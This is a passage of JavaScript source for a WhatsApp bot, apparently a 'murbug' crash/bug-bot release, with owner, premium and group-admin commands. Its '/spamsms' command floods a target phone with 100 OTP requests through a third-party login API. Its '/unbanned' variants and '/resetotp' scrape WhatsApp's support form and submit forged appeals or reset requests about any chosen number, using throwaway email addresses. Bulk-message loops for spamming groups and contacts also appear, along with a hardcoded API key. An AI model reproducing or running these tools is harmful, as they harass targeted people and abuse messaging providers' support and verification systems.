        if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxx`)
        target = q.split("|")[0].replace(/[^0-9]/g, '')
        let ceknye = await qio.onWhatsApp(target + `@s.whatsapp.net`)
        if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
        orgkaya.push(target)
        fs.writeFileSync('./owner.json', JSON.stringify(orgkaya))
        m.reply(`Nomor ${target} Telah Menjadi Owner!!!`)
        await sleep(3500)
        qio.sendMessage(prem1 + '@s.whatsapp.net', {
          image: { url: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg' },
          caption: 'Kamu sekarang adalah Owner!!'
        }, { quoted: m })
        break


      case "/delowner":
        if (!isDeveloper) return
        if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxx`)
        target = q.split("|")[0].replace(/[^0-9]/g, '')
        unp = orgkaya.indexOf(ya)
        orgkaya.splice(unp, 1)
        fs.writeFileSync('./owner.json', JSON.stringify(orgkaya))
        m.reply(`Nomor ${target} Telah Di Hapus Owner!!!`)
        break
      //=================================================//
      case '/addseller':
        if (!isDeveloper) return
        if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxx`)
        var prem1 = q.split("|")[0].replace(/[^0-9]/g, '')
        orgkaya.push(prem1)
        fs.writeFileSync('./lib/seller.json', JSON.stringify(orgkaya))
        m.reply(`${prem1} Sudah menjadi orgkaya!!!`)
        await sleep(3500)
        qio.sendMessage(prem1 + '@s.whatsapp.net', {
          image: { url: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg' },
          caption: 'Kamu sekarang adalah Reseller!!'
        }, { quoted: m })
        break
      //=================================================//
      case '/delseller':
        if (!isDeveloper) return
        if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxx`)
        prem2 = q.split("|")[0].replace(/[^0-9]/g, '')
        unp = orgkaya.indexOf(prem2)
        orgkaya.splice(unp, 1)
        fs.writeFileSync('./lib/seller.json', JSON.stringify(orgkaya))
        m.reply(`${prem2} Tidak lagi Reseller!!!`)
        break

      case '/addprem':
        if (!isDeveloper) return
        if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxx`)
        var prem1 = q.split("|")[0].replace(/[^0-9]/g, '')
        orgkaya.push(prem1)
        fs.writeFileSync('./lib/premium.json', JSON.stringify(orgkaya))
        m.reply(`${prem1} Sudah menjadi orgkaya!!!`)
        await sleep(3500)
        qio.sendMessage(prem1 + '@s.whatsapp.net', {
          image: { url: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg' },
          caption: 'Kamu sekarang adalah User Premium!!'
        }, { quoted: m })
        break
      //=================================================//
      case '/delprem':
        if (!isDeveloper) return
        if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxx`)
        prem2 = q.split("|")[0].replace(/[^0-9]/g, '')
        unp = orgkaya.indexOf(prem2)
        orgkaya.splice(unp, 1)
        fs.writeFileSync('./lib/premium.json', JSON.stringify(orgkaya))
        m.reply(`${prem2} Tidak lagi Premium User!!!`)
        break

      case "/aksesmurbug":
        if (!isDeveloper) return
        if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxx`)
        var prem1 = q.split("|")[0].replace(/[^0-9]/g, '')
        orgkaya.push(prem1)
        fs.writeFileSync('./lib/murbug.json', JSON.stringify(orgkaya))
        m.reply(`${prem1} Telah Menjadi anggota murbug!!!`)
        await sleep(3500)
        qio.sendMessage(prem1 + '@s.whatsapp.net', {
          image: { url: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg' },
          caption: 'Kamu sekarang adalah Anggota Murbug!!'
        }, { quoted: m })
        break


      case "/delaksesmurbug":
        if (!isDeveloper) return
        if (!args[0]) return m.reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxx`)
        prem2 = q.split("|")[0].replace(/[^0-9]/g, '')
        unp = orgkaya.indexOf(prem2)
        orgkaya.splice(unp, 1)
        fs.writeFileSync('./lib/murbug.json', JSON.stringify(orgkaya))
        m.reply(`${prem2} Telah Di Hapus dari anggota murbug!!!`)
        break

      case '/listprem':
        if (!isPrem) return replygw(ownerprem)
        teksooo = '*List User Vip*\n\n'
        for (let i of owner) {
          teksooo += `- ${i}\n`
        }
        teksooo += `\n*Total : ${owner.length}*`
        qio.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
        break

      case '/sound1': case '/sound2': case '/sound3': case '/sound4': case '/sound5': case '/sound6': case '/sound7': case '/sound8': case '/sound9': case '/sound10': case '/sound11': case '/sound12': case '/sound13': case '/sound14': case '/sound15': case '/sound16': case '/sound17': case '/sound18': case '/sound19': case '/sound20': case '/sound21': case '/sound22': case '/sound23': case '/sound24': case '/sound25': case '/sound26': case '/sound27': case '/sound28': case '/sound29': case '/sound30': case '/sound31': case '/sound32': case '/sound33': case '/sound34': case '/sound35': case '/sound36': case '/sound37': case '/sound38': case '/sound39': case '/sound40': case '/sound41': case '/sound42': case '/sound43': case '/sound44': case '/sound45': case '/sound46': case '/sound47': case '/sound48': case '/sound49': case '/sound50': case '/sound51': case '/sound52': case '/sound53': case '/sound54': case '/sound55': case '/sound56': case '/sound57': case '/sound58': case '/sound59': case '/sound60': case '/sound61': case '/sound62': case '/sound63': case '/sound64': case '/sound65': case '/sound66': case '/sound67': case '/sound68': case '/sound69': case '/sound70': case '/sound71': case '/sound72': case '/sound73': case '/sound74': case '/sound75': case '/sound76': case '/sound77': case '/sound78': case '/sound79': case '/sound80': case '/sound81': case '/sound82': case '/sound83': case '/sound84': case '/sound85': case '/sound86': case '/sound87': case '/sound88': case '/sound89': case '/sound90': case '/sound91': case '/sound92': case '/sound93': case '/sound94': case '/sound95': case '/sound96': case '/sound97': case '/sound98': case '/sound99': case '/sound100': case '/sound101': case '/sound102': case '/sound103': case '/sound104': case '/sound105': case '/sound106': case '/sound107': case '/sound108': case '/sound109': case '/sound110': case '/sound111': case '/sound112': case '/sound113': case '/sound114': case '/sound115': case '/sound116': case '/sound117': case '/sound118': case '/sound119': case '/sound120': case '/sound121': case '/sound122': case '/sound123': case '/sound124': case '/sound125': case '/sound126': case '/sound127': case '/sound128': case '/sound129': case '/sound130': case '/sound131': case '/sound132': case '/sound133': case '/sound134': case '/sound135': case '/sound136': case '/sound137': case '/sound138': case '/sound139': case '/sound140': case '/sound141': case '/sound142': case '/sound143': case '/sound144': case '/sound145': case '/sound146': case '/sound147': case '/sound148': case '/sound149': case '/sound150': case '/sound151': case '/sound152': case '/sound153': case '/sound154': case '/sound155': case '/sound156': case '/sound157': case '/sound158': case '/sound159': case '/sound160': case '/sound161':

        qioganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
        await qio.sendMessage(from, {
          audio: qioganteng, mimetype: 'audio/mp4', ptt: true, contextInfo: {
            externalAdreply: {
              showAdAttribution: true,
              mediaType: 1,
              mediaUrl: 'https://wa.me/999999',
              title: `ⓧAʟᴡᴀʏsᴀǫɪᴏᴏCʀᴀsʜ.ᴡʜᴀᴛsᴀᴘᴘ.ᴄᴏᴍ`,
              sourceUrl: `https://wa.me/999999`,
              thumbnail: qioimage
            }
          }
        })
        break

      case '/pushkontak': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!qtext) return m.reply(global.notext)
        let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
        let teksnye = `${q}`
        m.reply(`*Send a message to ${mem.length} people, time is over ${mem.length * 3} second*`)
        for (let geek of mem) {
          await sleep(5000)
          qio.sendMessage(geek, { text: `${teksnye}` }, { quoted: m })
        }
        m.reply(`*Successfully sent message To ${mem.length} person*`)
      }
        break

      case '/bcgroup': {
        if (!isPrem) return replygw(ownerprem)
        if (!qtext) return m.reply(global.notext)

        let getGroups = await qio.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let anu = groups.map(v => v.id)
        m.reply(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
        for (let i of anu) {
          await sleep(1500)
          qio.sendMessage(i, { text: `${qtext}` }, { quoted: m })
        }
        m.reply(`Successfully Sending Broadcast To ${anu.length} Group`)
      }
        break

      case '/hidetag': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)

        qio.sendMessage(from, { text: q ? q : '', mentions: participants.map(a => a.id) }, { quoted: m })
      }
        break

      case '/kick': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!isBotAdmins) return m.reply(global.nobotadmin)
        if (!isAdmins) return m.reply(global.usernoadmin)

        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await qio.groupParticipantsUpdate(from, [users], 'remove')
      }
        break

      case '/add': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!isBotAdmins) return m.reply(global.nobotadmin)
        if (!isAdmins) return m.reply(global.usernoadmin)

        let users = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await qio.groupParticipantsUpdate(from, [users], 'add')
      }
        break

      case '/promote': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!isBotAdmins) return m.reply(global.nobotadmin)
        if (!isAdmins) return m.reply(global.usernoadmin)

        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await qio.groupParticipantsUpdate(from, [users], 'promote')
      }
        break

      case '/demote': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!isBotAdmins) return m.reply(global.nobotadmin)
        if (!isAdmins) return m.reply(global.usernoadmin)

        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await qio.groupParticipantsUpdate(from, [users], 'demote')
      }
        break

      case '/editsubjek': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!isBotAdmins) return m.reply(global.nobotadmin)
        if (!isAdmins) return m.reply(global.usernoadmin)
        if (!qtext) return m.reply(global.notext)

        await qio.groupUpdateSubject(from, qtext)
      }
        break

      case '/editdesk': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!isBotAdmins) return m.reply(global.nobotadmin)
        if (!isAdmins) return m.reply(global.usernoadmin)
        if (!qtext) return m.reply(global.notext)

        await qio.groupUpdateDescription(from, qtext)
      }
        break

      case '/linkgroup': case '/linkgc': {
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!isBotAdmins) return m.reply(global.nobotadmin)

        let responsegg = await qio.groupInviteCode(from)
        qio.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
      }
        break

      case '/resetlinkgc':
        if (!isPrem) return replygw(ownerprem)
        if (!m.isGroup) return m.reply(global.noingroup)
        if (!isBotAdmins) return m.reply(global.nobotadmin)

        qio.groupRevokeInvite(from)
        break

      case '/public': {
        if (!isPrem) return replygw(ownerprem)
        qio.public = true
        m.reply('Sukse Change To Public')
      }
        break

      case '/self': {
        if (!isPrem) return replygw(ownerprem)
        qio.public = false
        m.reply('Sukse Change To Self')
      }
        break

      case '/unbanned': {
        if (!isMurbug) return replygw(ownerprem)
        if (m.quoted || q) {
          tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          targetnya = tosend.split('@')[0]

          try {
            axioss = require('axios')
            ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
            email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
            cookie = ntah.headers["set-cookie"].join("; ")
            cheerio = require('cheerio');
            $ = cheerio.load(ntah.data)
            $form = $("form");
            url = new URL($form.attr("action"), "https://www.whatsapp.com").href
            form = new URLSearchParams()
            form.append("jazoest", $form.find("input[name=jazoest]").val())
            form.append("lsd", $form.find("input[name=lsd]").val())
            form.append("step", "submit")
            form.append("country_selector", "+")
            form.append("phone_number", `+${targetnya}`,)
            form.append("email", email.data[0])
            form.append("email_confirm", email.data[0])
            form.append("platform", "ANDROID")
            form.append("your_message", `Привет WhatsApp Мой номер WhatsApp был заблокирован без причины. Пожалуйста, повторно активируйте мой номер WhatsApp, так как этот номер содержит много моей личной информации, которую я храню на этом номере, а также использую этот номер для своей офисной работы, что очень важно. Пожалуйста, активируйте мой номер WhatsApp как можно скорее. Спасибо.${targetnya}`)
            form.append("__user", "0")
            form.append("__a", "1")
            form.append("__csr", "")
            form.append("__req", "8")
            form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
            form.append("dpr", "1")
            form.append("__ccg", "UNKNOWN")
            form.append("__rev", "1007735016")
            form.append("__comment_req", "0")

            res = await axioss({
              url,
              method: "POST",
              data: form,
              headers: {
                cookie
              }

            })
            m.reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
            payload = String(res.data)
            if (payload.includes(`"payload":true`)) {
            } else if (payload.includes(`"payload":false`)) {
            } else m.reply(util.format(res.data))
          } catch (err) { m.reply(`${err}`) }
        } else m.reply('Insert Number')
      }
        break

      case '/unbannedv2': {
        if (!isMurbug) return replygw(ownerprem)
        if (m.quoted || q) {
          tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          targetnya = tosend.split('@')[0]

          try {
            axioss = require('axios')
            ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
            email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
            cookie = ntah.headers["set-cookie"].join("; ")
            cheerio = require('cheerio');
            $ = cheerio.load(ntah.data)
            $form = $("form");
            url = new URL($form.attr("action"), "https://www.whatsapp.com").href
            form = new URLSearchParams()
            form.append("jazoest", $form.find("input[name=jazoest]").val())
            form.append("lsd", $form.find("input[name=lsd]").val())
            form.append("step", "submit")
            form.append("country_selector", "+")
            form.append("phone_number", `+${targetnya}`,)
            form.append("email", email.data[0])
            form.append("email_confirm", email.data[0])
            form.append("platform", "ANDROID")
            form.append("your_message", `Привет, поддержка WhatsApp. Несколько дней назад я открыл приложение WhatsApp, но получил уведомление о том, что моя учетная запись WhatsApp не авторизована, и попросил зарегистрировать новый номер телефона. Почему мой номер не может использовать WhatsApp? Я считаю, что я никогда не нарушал политику WhatsApp, никогда не причинял вреда другим пользователям WhatsApp и использую WhatsApp только для бизнеса своей компании. Пожалуйста, повторно активируйте мой номер WhatsApp, поскольку этот номер содержит важные данные для моего бизнеса и деятельности. Пожалуйста, обработайте мой запрос как можно быстрее.${targetnya}`)
            form.append("__user", "0")
            form.append("__a", "1")
            form.append("__csr", "")
            form.append("__req", "8")
            form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
            form.append("dpr", "1")
            form.append("__ccg", "UNKNOWN")
            form.append("__rev", "1007735016")
            form.append("__comment_req", "0")

            res = await axioss({
              url,
              method: "POST",
              data: form,
              headers: {
                cookie
              }

            })
            m.reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
            payload = String(res.data)
            if (payload.includes(`"payload":true`)) {
            } else if (payload.includes(`"payload":false`)) {
            } else m.reply(util.format(res.data))
          } catch (err) { m.reply(`${err}`) }
        } else m.reply('Insert Number!')
      }
        break

      case '/memek':
        m.reply('anjay')
        break

      case '/unbannedv3': {
        if (!isMurbug) return replygw(ownerprem)
        if (m.quoted || q) {
          tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          targetnya = tosend.split('@')[0]

          try {
            axioss = require('axios')
            ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
            email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
            cookie = ntah.headers["set-cookie"].join("; ")
            cheerio = require('cheerio');
            $ = cheerio.load(ntah.data)
            $form = $("form");
            url = new URL($form.attr("action"), "https://www.whatsapp.com").href
            form = new URLSearchParams()
            form.append("jazoest", $form.find("input[name=jazoest]").val())
            form.append("lsd", $form.find("input[name=lsd]").val())
            form.append("step", "submit")
            form.append("country_selector", "+")
            form.append("phone_number", `+${targetnya}`,)
            form.append("email", email.data[0])
            form.append("email_confirm", email.data[0])
            form.append("platform", "ANDROID")
            form.append("your_message", `Здравствуйте, доброе утро, WhatsApp. Я пользователь WhatsApp со следующим номером ${targetnya}. У меня возникла проблема с блокировкой моего номера WhatsApp. Когда я открыл приложение WhatsApp, я получил уведомление: «Эта учетная запись не может использовать приложение WhatsApp». Раньше я отправлял сообщения в чат своей семье только во время работы. и я не считаю, что совершил какое-либо нарушение условий обслуживания WhatsApp. Приношу извинения, я рассматриваю возможность повторной активации заблокированной учетной записи WhatsApp. Спасибо`)
            form.append("__user", "0")
            form.append("__a", "1")
            form.append("__csr", "")
            form.append("__req", "8")
            form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
            form.append("dpr", "1")
            form.append("__ccg", "UNKNOWN")
            form.append("__rev", "1007735016")
            form.append("__comment_req", "0")

            res = await axioss({
              url,
              method: "POST",
              data: form,
              headers: {
                cookie
              }

            })
            m.reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
            payload = String(res.data)
            if (payload.includes(`"payload":true`)) {
            } else if (payload.includes(`"payload":false`)) {
            } else m.reply(util.format(res.data))
          } catch (err) { m.reply(`${err}`) }
        } else m.reply('Insert number!')
      }
        break

      case '/resetotp': {
        if (!isMurbug) return replygw(ownerprem)
        if (m.quoted || q) {
          tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          targetnya = tosend.split('@')[0]

          try {
            axioss = require('axios')
            ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
            email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
            cookie = ntah.headers["set-cookie"].join("; ")
            cheerio = require('cheerio');
            $ = cheerio.load(ntah.data)
            $form = $("form");
            url = new URL($form.attr("action"), "https://www.whatsapp.com").href
            form = new URLSearchParams()
            form.append("jazoest", $form.find("input[name=jazoest]").val())
            form.append("lsd", $form.find("input[name=lsd]").val())
            form.append("step", "submit")
            form.append("country_selector", "+")
            form.append("phone_number", `+${targetnya}`,)
            form.append("email", email.data[0])
            form.append("email_confirm", email.data[0])
            form.append("platform", "ANDROID")
            form.append("your_message", `Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp.${targetnya}`)
            form.append("__user", "0")
            form.append("__a", "1")
            form.append("__csr", "")
            form.append("__req", "8")
            form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
            form.append("dpr", "1")
            form.append("__ccg", "UNKNOWN")
            form.append("__rev", "1007735016")
            form.append("__comment_req", "0")

            res = await axioss({
              url,
              method: "POST",
              data: form,
              headers: {
                cookie
              }

            })
            m.reply(`i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏`)
            payload = String(res.data)
            if (payload.includes(`"payload":true`)) {
            } else if (payload.includes(`"payload":false`)) {
            } else m.reply(util.format(res.data))
          } catch (err) { m.reply(`${err}`) }
        } else m.reply('Insert number!')
      }
        break

      case '/spamsms': {
        if (!isMurbug) return m.reply('*Premium only*')

        const froms = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        if (m.quoted || qtext) {
          if (froms.startsWith('08')) return m.reply('Awali nomor dengan +62')
          let nosms = '+' + froms.replace('@s.whatsapp.net', '')
          let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
          let ua = mal[Math.floor(Math.random() * mal.length)];
          let axios = require('axios').default;
          let hd = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
          };
          const dat = {
            'phone': nosms
          };
          for (let x = 0; x < 100; x++) {
            axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
              headers: hd
            }).then(res => {
              console.log(res);
            }).catch(err => {
              console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY ALWAYSAQIOO`);
            });
          }
        } else m.reply(`Use of spam SMS number/m.reply target message*\nExample of spam SMS +6281214281312`)
        m.reply(`SMS/call spam will be sent to the target number`)
      }
        break

      case '/infobot':
        infobot = {
          image: qioimage,
          caption: `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
- 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊
·> 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : ${global.botname}
·> 𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : ${global.namaowner}
·> 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : Qioo V18
·> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : Alwaysaqioo
·> 𝐒𝐩𝐞𝐞𝐝 : ${speed()} miliseconds
·> 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
- 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊
·> 𝐍𝐚𝐦𝐞 : ${m.pushName}
·> 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : ${isPrem ? '✅' : `❌`}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`
        }
        qio.sendMessage(from, infobot)
        break

      case '/sticker':
        if (!quoted) return m.reply(`m.reply to Video/Image With Caption ${prefix + command}`)
        if (/image/.test(mime)) {

          let media = await quoted.download()
          let encmedia = await qio.sendImageAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
          await fs.unlinkSync(encmedia)
        } else if (/video/.test(mime)) {
          if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximum 10 seconds!')
          let media = await quoted.download()
          let encmedia = await qio.sendVideoAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
          await fs.unlinkSync(encmedia)
        } else {
          return m.reply(`Send Images/Videos With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
        }
        break

      case '/attp':
        if (args.length == 0) return m.reply(global.notext)

        ini_txt = args.join(" ")
        ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
        qio.sendMessage(from, { sticker: ini_buffer }, { quoted: m })
        break

      case '/smeme':
        if (!qtext) return m.reply(global.notext)
        if (!quoted) throw `m.reply to Image With Caption ${prefix + command}`
        if (/image/.test(mime)) {

          mee = await qio.downloadAndSaveMediaMessage(quoted)
          mem = await uptotelegra(mee)
          kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${qtext}.png?background=${mem}`)
          qio.sendImageAsSticker(from, kaytid, m, { packname: global.sticker1, author: global.sticker2 })
        }
        break

      case '/tiktokmp4': case '/tiktokmp3': case '/ytmp4': case '/ytmp3': case '/igmp3': case '/igmp4':
        if (!isPrem) return replygw(ownerprem)
        if (!q) return m.reply(' Enter the Target number Prefix "+" and Country Code')
        await qio.sendMessage(from, { text: `https://id.savefrom.net/247/#url=${q}` }, { quoted: m })
        sleep(2000)
        m.reply(`👆klik link untuk lalu download ${command}`)
        break

      case '/inspect': case '/getidgrup': {
        if (!isMurbug) return replygw(ownerprem)
        if (!qtext) return m.reply('Link?')
        let linkRegex = args.join(" ")
        let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
        if (!coded) return m.reply("Link Invalid")
        qio.query({
          tag: "iq",
          attrs: {
            type: "get",
            xmlns: "w:g2",
            to: "@g.us"
          },
          content: [{ tag: "invite", attrs: { code: coded } }]
        }).then(async (res) => {
          tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
          m.reply(tekse)
        })
      }
        break

      case '/startytmp3': {
        if (!q) return m.reply(`Example : ${prefix + command} karna su sayang`)
        const qioplay = require('./lib/ytdl2')
        const { fetchBuffer } = require("./lib/storage2")
        let yts = require("youtube-yts")
        let search = await yts(q)
        let anup3k = search.videos[0]
        const pl = await qioplay.mp3(anup3k.url)
        await qio.sendMessage(from, {
          audio: fs.readFileSync(pl.path),
          fileName: anup3k.title + '.mp3',
          mimetype: 'audio/mp4', ptt: true,
          contextInfo: {
            externalAdreply: {
              title: anup3k.title,
              body: `Alwaysaqioo`,
              thumbnail: await fetchBuffer(pl.meta.image),
              mediaType: 2,
              mediaUrl: anup3k.url,
            }

          },
        }, { quoted: m })
        await fs.unlinkSync(pl.path)
      }
        break

      case '/yts': case '/ytsearch': {
        if (!q) return m.reply(`Example : ${prefix + command} story wa anime`)
        yts = require("yt-search")
        search = await yts(q)
        nyaabanaayts = 'YouTube Search\n\n Result From ' + q + '\n\n'
        no = 1
        for (let i of search.all) {
          hasilpencarian = `${nyaabanaayts}\nNo : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Uploaded : ${i.ago}\n Url : ${i.url}\n\n─────────────────\n\n`
        }
        qio.sendMessage(from, { image: { url: search.all[0].thumbnail }, caption: hasilpencarian }, { quoted: m })
      }
        break

      case '/style': case '/styletext': {
        let { styletext } = require('./lib/scraper')
        if (!q) return m.reply('Enter Query text!')
        let anu = await styletext(q)
        let teks = `Style Text From ${q}\n\n`
        for (let i of anu) {
          teks += `*${i.name}* : ${i.result}\n\n`
        }
        m.reply(teks)
      }
        break

      case '/fliptext': {
        if (args.length < 1) return m.reply(`Example:\n${prefix}fliptext qio`)
        quere = args.join(" ")
        flipe = quere.split('').reverse().join('')
        m.reply(`\`「 FLIP TEXT 」\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
      }
        break

      case '/setppbot': case '/setbotpp': {
        if (!isPrem) return replygw(ownerprem)
        if (!quoted) return m.reply(`Send/m.reply Image With Caption ${prefix + command}`)
        if (!/image/.test(mime)) return m.reply(`Send/m.reply Image With Caption ${prefix + command}`)
        if (/webp/.test(mime)) return m.reply(`Send/m.reply Image With Caption ${prefix + command}`)
        var medis = await qio.downloadAndSaveMediaMessage(quoted)
        if (args[0] == `/full`) {
          var { img } = await generateProfilePicture(medis)
          await qio.query({
            tag: 'iq',
            attrs: {
              to: botNumber,
              type: 'set',
              xmlns: 'w:profile:picture'
            },
            content: [
              {
                tag: 'picture',
                attrs: { type: 'image' },
                content: img
              }
            ]
          })
          fs.unlinkSync(medis)
          m.reply(`Success`)
        } else {
          var memeg = await qio.updateProfilePicture(botNumber, { url: medis })
          fs.unlinkSync(medis)
          m.reply(`Success`)
        }
      }
        break

      case '/tiktokgirl':
        m.reply('Tunggu')
